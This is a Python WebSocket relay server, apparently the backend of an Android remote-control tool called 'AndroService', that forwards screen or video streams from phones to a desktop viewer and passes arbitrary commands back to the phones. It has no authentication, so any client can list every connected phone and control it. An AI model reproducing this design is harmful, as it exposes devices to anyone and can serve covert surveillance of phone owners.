"""
AndroService — Relay Server
Render.com bepul tier uchun optimallashtirilgan
HTTP + WebSocket upgrade qo'llab-quvvatlanadi
"""

import asyncio
import json
import logging
import os
import time
import uuid
from aiohttp import web
import aiohttp

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ── Ulanib turgan qurilmalar ──────────────────────────────────────
phones: dict[str, dict] = {}
viewers: dict[object, str] = {}

# ─────────────────────────────────────────────────────────────────

async def websocket_handler(request):
    """Barcha WebSocket ulanishlar shu yerga tushadi."""
    ws = web.WebSocketResponse(
        max_msg_size=10 * 1024 * 1024,  # 10MB video chunk uchun
        heartbeat=20
    )
    await ws.prepare(request)

    role = None
    device_id = None

    try:
        # Birinchi xabar — kim ekanini aniqlaymiz
        msg = await asyncio.wait_for(ws.receive(), timeout=15)
        if msg.type == aiohttp.WSMsgType.TEXT:
            data = json.loads(msg.data)
            role = data.get("role")
            device_id = data.get("device_id") or str(uuid.uuid4())

            if role == "phone":
                await handle_phone(ws, device_id, data)
            elif role == "viewer":
                await handle_viewer(ws, device_id)
            else:
                await ws.close(message=b"Noma'lum rol")

    except asyncio.TimeoutError:
        log.warning("Birinchi xabar kelmadi")
    except Exception as e:
        log.error(f"Xato: {e}")
    finally:
        await cleanup(ws, role, device_id)

    return ws


async def handle_phone(ws, device_id: str, info: dict):
    """Telefon ulanishi — ma'lumotlarni viewerga uzatadi."""
    phones[device_id] = {
        "ws": ws,
        "info": {
            "device_id": device_id,
            "model": info.get("model", "Noma'lum qurilma"),
            "android": info.get("android", "?"),
            "sdk": info.get("sdk", 0),
        },
        "viewer": None,
        "connected_at": time.time(),
    }
    log.info(f"📱 Telefon: {info.get('model')} [{device_id}]")
    await broadcast_device_list()

    async for msg in ws:
        if msg.type in (aiohttp.WSMsgType.TEXT, aiohttp.WSMsgType.BINARY):
            entry = phones.get(device_id)
            if entry and entry["viewer"]:
                try:
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        await entry["viewer"].send_str(msg.data)
                    else:
                        await entry["viewer"].send_bytes(msg.data)
                except Exception:
                    entry["viewer"] = None
        elif msg.type == aiohttp.WSMsgType.ERROR:
            break


async def handle_viewer(ws, viewer_id: str):
    """EXE ulanishi — buyruqlarni telefonga uzatadi."""
    log.info(f"🖥️  Viewer: [{viewer_id}]")
    await send_device_list(ws)
    target_id = None

    async for msg in ws:
        if msg.type == aiohttp.WSMsgType.TEXT:
            try:
                data = json.loads(msg.data)
                cmd = data.get("cmd")

                if cmd == "connect_device":
                    tid = data.get("device_id")
                    entry = phones.get(tid)
                    if entry:
                        if target_id and target_id in phones:
                            phones[target_id]["viewer"] = None
                        target_id = tid
                        entry["viewer"] = ws
                        viewers[ws] = tid
                        log.info(f"🔗 Viewer → [{tid}]")
                        await ws.send_str(json.dumps({
                            "type": "connected",
                            "device_id": tid,
                            "info": entry["info"]
                        }))
                    else:
                        await ws.send_str(json.dumps({
                            "type": "error",
                            "msg": "Telefon topilmadi yoki oflayn"
                        }))

                elif cmd == "disconnect_device":
                    if target_id and target_id in phones:
                        phones[target_id]["viewer"] = None
                    target_id = None
                    viewers.pop(ws, None)

                elif cmd == "get_devices":
                    await send_device_list(ws)

                else:
                    # Boshqa buyruqlar → telefonga
                    if target_id:
                        entry = phones.get(target_id)
                        if entry and entry["ws"]:
                            await entry["ws"].send_str(msg.data)

            except json.JSONDecodeError:
                if target_id:
                    entry = phones.get(target_id)
                    if entry and entry["ws"]:
                        await entry["ws"].send_str(msg.data)

        elif msg.type == aiohttp.WSMsgType.BINARY:
            if target_id:
                entry = phones.get(target_id)
                if entry and entry["ws"]:
                    await entry["ws"].send_bytes(msg.data)

        elif msg.type == aiohttp.WSMsgType.ERROR:
            break


async def cleanup(ws, role, device_id):
    if role == "phone" and device_id in phones:
        entry = phones.pop(device_id)
        if entry.get("viewer"):
            try:
                await entry["viewer"].send_str(json.dumps({
                    "type": "device_disconnected",
                    "device_id": device_id
                }))
            except Exception:
                pass
        log.info(f"📵 Telefon uzildi [{device_id}]")
        await broadcast_device_list()
    elif role == "viewer":
        tid = viewers.pop(ws, None)
        if tid and tid in phones:
            phones[tid]["viewer"] = None
        log.info(f"🖥️  Viewer uzildi")


async def send_device_list(ws):
    now = time.time()
    devices = []
    for did, entry in phones.items():
        info = entry["info"].copy()
        info["online"] = True
        info["connected_seconds"] = int(now - entry["connected_at"])
        info["has_viewer"] = entry["viewer"] is not None
        devices.append(info)
    await ws.send_str(json.dumps({"type": "device_list", "devices": devices}))


async def broadcast_device_list():
    if not viewers:
        return
    now = time.time()
    devices = []
    for did, entry in phones.items():
        info = entry["info"].copy()
        info["online"] = True
        info["connected_seconds"] = int(now - entry["connected_at"])
        info["has_viewer"] = entry["viewer"] is not None
        devices.append(info)
    msg = json.dumps({"type": "device_list", "devices": devices})
    for vws in list(viewers):
        try:
            await vws.send_str(msg)
        except Exception:
            viewers.pop(vws, None)


async def health(request):
    """Render health check uchun."""
    return web.Response(text=json.dumps({
        "status": "ok",
        "phones": len(phones),
        "viewers": len(viewers)
    }), content_type="application/json")


def main():
    port = int(os.environ.get("PORT", 10000))
    app = web.Application()
    app.router.add_get("/ws", websocket_handler)
    app.router.add_get("/health", health)
    app.router.add_get("/", health)
    log.info(f"🚀 AndroService ishga tushdi: port {port}")
    web.run_app(app, host="0.0.0.0", port=port)


if __name__ == "__main__":
    main()
